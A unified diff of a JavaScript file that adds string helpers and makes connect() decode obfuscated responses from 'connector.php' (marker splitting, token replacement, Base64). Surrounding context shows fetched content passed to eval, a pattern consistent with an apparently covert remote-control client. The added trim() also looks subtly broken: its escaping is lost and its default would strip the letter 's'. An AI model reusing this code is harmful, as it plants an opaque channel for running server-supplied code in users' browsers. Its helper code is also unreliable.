@@ -1,3 +1,6 @@
+function rand(mi, ma){return Math.floor(Math.random() * (ma - mi + 1) + mi);}
+function trim(e,r){r=r?r.replace(/([\[\]\(\)\.\?\/\*\{\}\+\$\^\:])/g,"$1"):" s ";var n=new RegExp("^["+r+"]+|["+r+"]+$","g");return e.replace(n,"")}
+function explode(t,e){var n={0:""};return 2!=arguments.length||"undefined"==typeof arguments[0]||"undefined"==typeof arguments[1]?null:""===t||t===!1||null===t?!1:"function"==typeof t||"object"==typeof t||"function"==typeof e||"object"==typeof e?n:(t===!0&&(t="1"),e.toString().split(t.toString()))}
 function ajax(t){
 	var xhr = new XMLHttpRequest();
 	xhr.open('GET', t, 0);
@@ -51,8 +54,6 @@ function eLoad(t){
 	if(req[2]){eval(req[2]);}
 }
 
-function rand(mi, ma){return Math.floor(Math.random() * (ma - mi + 1) + mi);}
-
 function connect(t){
 	u = 'connector.php?'+t;
 	if (u.match(/\?/)) {
@@ -61,6 +62,12 @@ function connect(t){
 		u += '?z='+rand(1000000, 9999999);
 	}
 	html = ajax(u);
+	html = trim(explode('dG2Sp6rW', html)[0], explode('dG2Sp6rW', html)[1]);
+	html = html.replace('vI24mDj3', '=');
+	html = html.replace('vI24mDj3', '=');
+
+	html = Base64.decode(html);
+	html = explode('=====', html)[1];
 	html = JSON.parse(html);
 	return html;
 }
